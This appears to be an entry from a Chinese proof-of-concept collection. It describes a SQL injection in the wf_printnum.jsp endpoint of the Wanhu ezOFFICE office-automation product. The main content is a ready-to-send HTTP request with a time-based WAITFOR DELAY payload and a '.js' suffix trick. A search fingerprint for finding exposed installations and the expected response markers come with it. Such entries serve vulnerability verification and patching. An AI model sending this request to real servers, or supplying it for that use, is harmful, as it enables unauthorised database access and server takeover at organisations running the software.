﻿# 万户 ezOFFICE wf_printnum.jsp SQL注入漏洞

> 更新时间：2024-01-24

> 漏洞编号：

> 漏洞说明：万户OA ezoffice是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公软件产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。
万户 ezOFFICE wf_printnum.jsp 接口存在SQL注入漏洞，恶意攻击者可利用此漏洞获取数据库信息，获取服务器控制权限

> 漏洞特征：app="ezOFFICE协同管理平台"

> 验证脚本：HTTP

```
GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;.js?recordId=1;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

> 响应代码特征：200

> 响应内容特征：0

> 上传文件定位：


> 验证文件来源：万户 ezOFFICE wf_printnum.jsp SQL注入漏洞.poc
